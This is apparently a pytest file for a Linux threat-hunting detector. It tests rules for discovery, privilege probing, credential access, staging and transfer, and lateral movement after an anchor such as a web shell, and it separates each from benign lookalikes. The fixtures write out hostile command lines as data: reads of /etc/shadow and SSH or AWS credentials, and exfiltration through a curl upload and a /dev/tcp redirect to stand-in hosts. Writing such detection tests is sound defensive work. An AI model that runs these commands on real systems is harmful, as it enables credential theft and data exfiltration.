"""M3 context-rule catalog: anchor-gated discovery, privilege, credential, staging and lateral rules.

Every rule gets a malicious positive, hard-benign lookalikes (admin troubleshooting without an anchor,
package-manager queries, backup jobs), a disallowed-anchor/disallowed-link case that must not fire, a
missing-field case that never becomes a complete negative, a timestamp-boundary case, and an inferred-link
case capped at lead. Fixtures use general Linux tradecraft, never any evaluation dataset's commands, hosts
or addresses.
"""
from datetime import UTC, datetime, timedelta

import pytest

from romulus.agent.models import PivotCoverage
from romulus.decide.policy import decide
from romulus.detect.base import ContextAnchor, ContextLink
from romulus.detect.context import (
    CredentialAccessInContext,
    LateralMovement,
    PostAccessDiscovery,
    PrivilegeProbing,
    StagingAndTransfer,
)
from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv
from romulus.hunt.context import evaluate_context
from romulus.hunt.expansion import ExpansionEngine
from romulus.hunt.links import LinkResult
from romulus.sources.models import Window
from romulus.store.db import make_engine, migrate
from romulus.store.repo import Repo

T0 = datetime(2024, 11, 18, 14, 0, tzinfo=UTC)


def exec_event(event_id, argv, *, executable=None, outcome=Outcome.success, ts=T0, host="web1", **fields):
    typed = {
        "process.executable": fv(executable or argv[0], f"{event_id}:exe"),
        "process.argv": fv(argv, f"{event_id}:argv"),
        "process.session_id": fv(42, f"{event_id}:ses"),
    }
    for name, value in fields.items():
        typed[name.replace("__", ".")] = fv(value, f"{event_id}:{name}")
    return TypedEvent(
        id=event_id, family="process_exec", ts=ts, host=host, outcome=outcome,
        fields=typed, raw=[RawRef(target="host-x", native_id=event_id, digest="d")], normalizer="test@1",
    )


def socket_event(event_id, dst_ip, dst_port, *, syscall="connect", outcome=Outcome.success, ts=T0, host="web1"):
    return TypedEvent(
        id=event_id, family="net_socket", ts=ts, host=host, outcome=outcome,
        fields={"socket.syscall": fv(syscall, f"{event_id}:sc"),
                "destination.ip": fv(dst_ip, f"{event_id}:dip"),
                "destination.port": fv(dst_port, f"{event_id}:dport"),
                "process.session_id": fv(42, f"{event_id}:ses")},
        raw=[RawRef(target="host-x", native_id=event_id, digest="d")], normalizer="test@1",
    )


def anchor(anchor_class="web_shell"):
    evidence = exec_event("anchor-event", ["/bin/sh"])
    return ContextAnchor(id="F-anchor", anchor_class=anchor_class, lane="urgent",
                         claim="a web-service shell was recorded", events=[evidence])


def link(strength="observed", link_type="process_lineage", status="complete"):
    evidence = exec_event("link-event", ["/bin/sh"])
    return ContextLink(id="L-link", link_type=link_type, strength=strength,
                       key={"host": "web1", "process.session_id": 42}, evidence_events=[evidence],
                       status=status)


def one(playbook, events, *, a=None, link_type="process_lineage", strength="observed"):
    return playbook().consume_linked(a or anchor(), link(strength=strength, link_type=link_type), events)


# --------------------------------------------------------------------------------------------------
# Post-access discovery: the broadened technique set (T1049/T1057/T1083/T1007/T1518/T1135/T1201/T1680).
# --------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("argv,executable,technique", [
    (["ps", "aux"], "/usr/bin/ps", "T1057"),
    (["top", "-b", "-n1"], "/usr/bin/top", "T1057"),
    (["ss", "-tunap"], "/usr/bin/ss", "T1049"),
    (["netstat", "-ano"], "/usr/bin/netstat", "T1049"),
    (["cat", "/etc/os-release"], "/usr/bin/cat", "T1082"),
    (["cat", "/proc/version"], "/usr/bin/cat", "T1082"),
    (["cat", "/etc/passwd"], "/usr/bin/cat", "T1087"),
    (["lsb_release", "-a"], "/usr/bin/lsb_release", "T1082"),
    (["df", "-h"], "/usr/bin/df", "T1680"),
    (["mount"], "/usr/bin/mount", None),            # bare mount lists, but we classify df/lsblk, not mount
    (["systemctl", "list-units"], "/usr/bin/systemctl", "T1007"),
    (["crontab", "-l"], "/usr/bin/crontab", "T1007"),
    (["dpkg", "-l"], "/usr/bin/dpkg", "T1518"),
    (["rpm", "-qa"], "/usr/bin/rpm", "T1518"),
    (["find", "/home", "-name", "*.key"], "/usr/bin/find", "T1083"),
    (["ls", "-la", "/root"], "/usr/bin/ls", "T1083"),
    (["env"], "/usr/bin/env", "T1082"),
    (["showmount", "-e", "fileserver"], "/usr/sbin/showmount", "T1135"),
    (["chage", "-l", "svc"], "/usr/bin/chage", "T1201"),
])
def test_discovery_broadened_classes(argv, executable, technique):
    matches = one(PostAccessDiscovery, [exec_event("d", argv, executable=executable)])
    if technique is None:
        assert matches == []
        return
    assert len(matches) == 1 and technique in matches[0].notes
    assert decide(matches[0], "h").admitted and matches[0].proposed_lane == "high"


@pytest.mark.parametrize("argv,executable", [
    (["apt", "install", "nginx"], "/usr/bin/apt"),          # package install, not a list query
    (["dpkg", "-i", "pkg.deb"], "/usr/bin/dpkg"),
    (["systemctl", "restart", "nginx"], "/usr/bin/systemctl"),
    (["ip", "addr", "add", "10.0.0.5/24", "dev", "eth0"], "/usr/sbin/ip"),   # a change, not a show
    (["ls", "-la", "/tmp"], "/usr/bin/ls"),                 # non-sensitive listing
    (["grep", "-R", "TODO", "/srv/app/src"], "/usr/bin/grep"),   # not a category file
    (["echo", "cat /etc/passwd"], "/usr/bin/echo"),         # the command name is only an argument of echo
])
def test_discovery_rejects_benign_and_modifying_invocations(argv, executable):
    assert one(PostAccessDiscovery, [exec_event("b", argv, executable=executable)]) == []


def test_discovery_does_not_fire_without_an_anchor_or_through_a_disallowed_link():
    ev = [exec_event("d", ["ss", "-tunap"], executable="/usr/bin/ss")]
    assert PostAccessDiscovery().consume_linked(None, link(), ev) == []                 # no anchor
    assert one(PostAccessDiscovery, ev, link_type="host_after_anchor") == []            # disallowed link
    assert one(PostAccessDiscovery, ev, a=anchor("network_observation")) == []          # disallowed anchor class


def test_discovery_inferred_link_is_capped_at_lead_and_worded_as_hypothesis():
    match = one(PostAccessDiscovery, [exec_event("d", ["uname", "-a"], executable="/usr/bin/uname")],
                strength="inferred")[0]
    assert match.proposed_lane == "lead" and "hypothesis" in match.claim.lower()


# --------------------------------------------------------------------------------------------------
# Privilege probing and escalation.
# --------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("argv,executable,technique", [
    (["sudo", "-l"], "/usr/bin/sudo", "T1548.003"),
    (["find", "/", "-perm", "-4000"], "/usr/bin/find", "T1548.001"),
    (["getcap", "-r", "/"], "/usr/sbin/getcap", "T1548"),
    (["pkexec", "/bin/sh"], "/usr/bin/pkexec", "T1548"),
    (["cat", "/etc/sudoers"], "/usr/bin/cat", "T1548.003"),
])
def test_privilege_probing_positives(argv, executable, technique):
    match = one(PrivilegeProbing, [exec_event("p", argv, executable=executable)])
    assert len(match) == 1 and technique in match[0].notes
    assert decide(match[0], "h").admitted


def test_privilege_escalation_euid0_from_nonroot_login():
    gained = exec_event("g", ["/usr/bin/id"], executable="/usr/bin/id",
                        process__euid="0", process__auid="1000")
    match = one(PrivilegeProbing, [gained])
    assert len(match) == 1 and "T1548" in match[0].notes and "auid=1000" in match[0].claim


@pytest.mark.parametrize("argv,executable,euid,auid", [
    (["sudo", "systemctl", "status", "nginx"], "/usr/bin/sudo", None, None),  # sudo without -l: not probing
    (["find", "/var/log", "-name", "*.log"], "/usr/bin/find", None, None),    # ordinary find, not a SUID scan
    (["id"], "/usr/bin/id", "0", "0"),                                        # root login running as root
    (["id"], "/usr/bin/id", None, "1000"),                                    # non-root, no euid-0 process
])
def test_privilege_probing_benign_lookalikes(argv, executable, euid, auid):
    fields = {}
    if euid is not None:
        fields["process__euid"] = euid
    if auid is not None:
        fields["process__auid"] = auid
    assert one(PrivilegeProbing, [exec_event("b", argv, executable=executable, **fields)]) == []


def test_privilege_probing_gated_by_anchor_and_link():
    ev = [exec_event("p", ["sudo", "-l"], executable="/usr/bin/sudo")]
    assert PrivilegeProbing().consume_linked(None, link(), ev) == []
    assert one(PrivilegeProbing, ev, link_type="source_ip") == []


# --------------------------------------------------------------------------------------------------
# Credential access.
# --------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("argv,executable,technique", [
    (["cat", "/etc/shadow"], "/usr/bin/cat", "T1003.008"),
    (["cp", "/home/alice/.ssh/id_rsa", "/tmp/k"], "/usr/bin/cp", "T1552.004"),
    (["cat", "/home/alice/.bash_history"], "/usr/bin/cat", "T1552.003"),
    (["cat", "/home/alice/.aws/credentials"], "/usr/bin/cat", "T1552.001"),
    (["cat", "/home/alice/.netrc"], "/usr/bin/cat", "T1552.001"),
])
def test_credential_access_positives(argv, executable, technique):
    match = one(CredentialAccessInContext, [exec_event("c", argv, executable=executable,
                                                        process__cwd="/home/alice")])
    assert len(match) == 1 and technique in match[0].notes
    assert decide(match[0], "h").admitted


@pytest.mark.parametrize("argv,executable", [
    (["cat", "/home/alice/.ssh/id_rsa.pub"], "/usr/bin/cat"),     # a public key is not a secret
    (["cat", "/home/alice/.ssh/known_hosts"], "/usr/bin/cat"),
    (["cat", "/etc/hostname"], "/usr/bin/cat"),                    # not a credential store
    (["cat", "/home/alice/.ssh/authorized_keys"], "/usr/bin/cat"),  # a public-key file, not a private key
])
def test_credential_access_benign_lookalikes(argv, executable):
    assert one(CredentialAccessInContext, [exec_event("b", argv, executable=executable)]) == []


def test_credential_access_gated_and_missing_field_is_never_a_complete_negative():
    ev = [exec_event("c", ["cat", "/etc/shadow"], executable="/usr/bin/cat")]
    assert PostAccessDiscovery  # imported
    assert CredentialAccessInContext().consume_linked(None, link(), ev) == []
    # Missing the required process.executable: counted, excluded, never a clean no-match.
    broken = TypedEvent(id="m", family="process_exec", ts=T0, host="web1", outcome=Outcome.success,
                        fields={"process.argv": fv(["cat", "/etc/shadow"], "m:argv")},
                        raw=[RawRef(target="host-x", native_id="m", digest="d")], normalizer="test@1")
    repo = _repo()
    evaluate_context(repo, "h1", anchor(), link(), [broken])
    cell = _cell(repo, "context.credential_access")
    assert cell["evaluated"] == 0 and cell["state"] != "no_match_complete"


# --------------------------------------------------------------------------------------------------
# Staging and transfer.
# --------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("argv,executable,technique", [
    (["tar", "-czf", "/tmp/out.tgz", "/etc"], "/bin/tar", "T1560.001"),
    (["base64", "/home/alice/report.docx"], "/usr/bin/base64", "T1027.013"),
    (["scp", "/tmp/out.tgz", "user@203.0.113.9:/tmp/"], "/usr/bin/scp", "T1021.004"),
    (["curl", "-T", "/tmp/out.tgz", "http://files.example.test/u"], "/usr/bin/curl", "T1048"),
    (["bash", "-c", "cat f > /dev/tcp/203.0.113.9/443"], "/bin/bash", "T1048"),
])
def test_staging_and_transfer_positives(argv, executable, technique):
    match = one(StagingAndTransfer, [exec_event("s", argv, executable=executable)])
    assert len(match) == 1 and technique in match[0].notes
    assert decide(match[0], "h").admitted


@pytest.mark.parametrize("argv,executable", [
    (["tar", "-czf", "/backup/scratch.tgz", "/var/cache/scratch"], "/bin/tar"),  # backup of a non-sensitive path
    (["base64", "/tmp/token.txt"], "/usr/bin/base64"),                            # non-sensitive operand
    (["scp", "/tmp/a", "/tmp/b"], "/usr/bin/scp"),                                # local copy, no remote host
    (["curl", "http://repo.example.test/pkg"], "/usr/bin/curl"),                  # a download, not an upload
])
def test_staging_and_transfer_benign_lookalikes(argv, executable):
    assert one(StagingAndTransfer, [exec_event("b", argv, executable=executable)]) == []


def test_staging_inferred_link_caps_at_lead():
    match = one(StagingAndTransfer, [exec_event("s", ["tar", "-czf", "/tmp/o.tgz", "/root"], executable="/bin/tar")],
                strength="inferred")[0]
    assert match.proposed_lane == "lead"


# --------------------------------------------------------------------------------------------------
# Lateral movement.
# --------------------------------------------------------------------------------------------------

def test_lateral_ssh_client_states_target_and_internal():
    match = one(LateralMovement, [exec_event("l", ["ssh", "admin@10.0.0.9", "id"], executable="/usr/bin/ssh")])
    assert len(match) == 1 and "T1021.004" in match[0].notes
    assert "10.0.0.9" in match[0].claim and "internal address" in match[0].claim


def test_lateral_socket_connect_internal_port_is_observed():
    match = one(LateralMovement, [socket_event("sk", "10.0.0.9", 445)])
    assert len(match) == 1 and "T1021.002" in match[0].notes
    assert "observed internal address" in match[0].claim and "10.0.0.9:445" in match[0].claim


def test_lateral_socket_unknown_outcome_is_worded_not_dropped():
    match = one(LateralMovement, [socket_event("sk", "10.0.0.9", 22, outcome=Outcome.unknown)])
    assert len(match) == 1 and "outcome is unknown" in match[0].claim
    assert decide(match[0], "h").admitted


@pytest.mark.parametrize("event", [
    socket_event("ext", "203.0.113.9", 22),              # external destination, not lateral
    socket_event("web", "10.0.0.9", 443),                # not a remote-service port
    socket_event("acc", "10.0.0.9", 22, syscall="accept"),  # inbound accept, not an outbound connect
])
def test_lateral_socket_benign_lookalikes(event):
    assert one(LateralMovement, [event]) == []


def test_lateral_gated_by_anchor_and_link():
    ev = [socket_event("sk", "10.0.0.9", 22)]
    assert LateralMovement().consume_linked(None, link(), ev) == []
    assert one(LateralMovement, ev, a=anchor("network_observation")) == []


# --------------------------------------------------------------------------------------------------
# Coverage: a missing field never yields a complete negative, for every new rule.
# --------------------------------------------------------------------------------------------------

def _repo():
    engine = make_engine(":memory:")
    migrate(engine)
    repo = Repo(engine)
    repo.create_hunt("h1", {"targets": []}, "digest", "test")
    return repo


def _cell(repo, rule_id):
    return next(c for c in repo.rule_cells("h1") if c["rule_id"] == rule_id)


@pytest.mark.parametrize("rule_id", [
    "context.post_access_discovery", "context.privilege_probing",
    "context.credential_access", "context.staging_and_transfer",
])
def test_new_rules_are_positive_only_and_never_write_a_complete_negative(rule_id):
    # A process event missing process.executable is counted as missing-required, never a clean no-match.
    broken = TypedEvent(id="m", family="process_exec", ts=T0, host="web1", outcome=Outcome.success,
                        fields={"process.argv": fv(["id"], "m:argv")},
                        raw=[RawRef(target="host-x", native_id="m", digest="d")], normalizer="test@1")
    repo = _repo()
    evaluate_context(repo, "h1", anchor(), link(), [broken])
    assert _cell(repo, rule_id)["state"] != "no_match_complete"


# --------------------------------------------------------------------------------------------------
# End-to-end through ExpansionEngine for one new rule (lateral movement via a socket connect).
# --------------------------------------------------------------------------------------------------

WINDOW = Window(start=T0 - timedelta(hours=1), end=T0 + timedelta(hours=1))


class _LateralFetcher:
    """A scripted link fetcher (cf. tests/test_expansion_engine.py) that returns one internal socket connect
    through the process-lineage link, at the far edge of the first window (a timestamp-boundary case)."""

    def __init__(self, repo, linked):
        self.repo, self.linked = repo, linked
        self.executor = type("Counter", (), {"source_queries": 0})()

    def fetch(self, anchor_, link_type, window, *, query_cap=None):
        self.executor.source_queries += 1
        ids = [self.linked.id] if link_type == "process_lineage" else []
        return LinkResult(
            id=f"L-{anchor_.finding_id}-{link_type}-{window.label}", anchor_id=anchor_.finding_id,
            link_type=link_type, window=window, strength="observed",
            key={"host": anchor_.host, "process.pid": 10}, status="complete",
            event_ids=ids, evidence_ids=sorted(anchor_.event_ids + ids), task_ids=["T1"],
            coverage=[PivotCoverage(target="host-x", dataset="linux.audit", start=window.start,
                                    end=window.end, status="complete", returned=len(ids), total=len(ids))],
            query_spend=1,
        )


def test_expansion_engine_publishes_lateral_context_finding():
    repo = _repo()
    repo.create_hunt("he", {
        "window": {"start": WINDOW.start.isoformat(), "end": WINDOW.end.isoformat()},
        "style": "broad", "targets": [], "pack": {"version": "test", "playbooks": []},
        "agent_mode": "off", "budgets": {"wall_clock_minutes": 120},
    }, "digest", "test")
    anchor_exec = exec_event("anchor-event", ["/bin/sh"], host="web1", process__pid=10)
    repo.save_evidence("he", [anchor_exec], {}, None)
    repo.save_candidate({
        "id": "F-anchor", "hunt_id": "he", "rule_id": "host.web_shell", "rule_version": "1",
        "claim": "web service spawned a shell", "claim_type": "observed_action",
        "event_ids": [anchor_exec.id], "predicate_fields": [], "entities": [["host", "web1", "host"]],
        "ts": anchor_exec.ts, "severity": "critical", "confidence": "high", "lane": "urgent",
        "priority": 100.0, "priority_reasons": [], "gate_results": {}, "benign_alternatives": [],
        "next_checks": [], "source_case_id": None, "source_anchor_id": None, "source_link_id": None,
    })
    boundary = T0 + timedelta(minutes=5)       # exactly the first window's far edge
    connect = socket_event("sk", "10.0.0.9", 22, ts=boundary, host="web1")
    connect = connect.model_copy(update={"fields": {**connect.fields,
                                                    "process.pid": fv(11, "sk:pid")}})
    repo.save_evidence("he", [connect], {}, None)

    ExpansionEngine(repo, "he", WINDOW, _LateralFetcher(repo, connect), max_source_queries=200).run()

    lateral = [c for c in repo.candidates("he") if c["rule_id"] == "context.lateral_movement"]
    assert len(lateral) == 1
    assert "10.0.0.9:22" in lateral[0]["claim"] and lateral[0]["lane"] == "high"
    assert lateral[0]["source_anchor_id"] == "F-anchor"
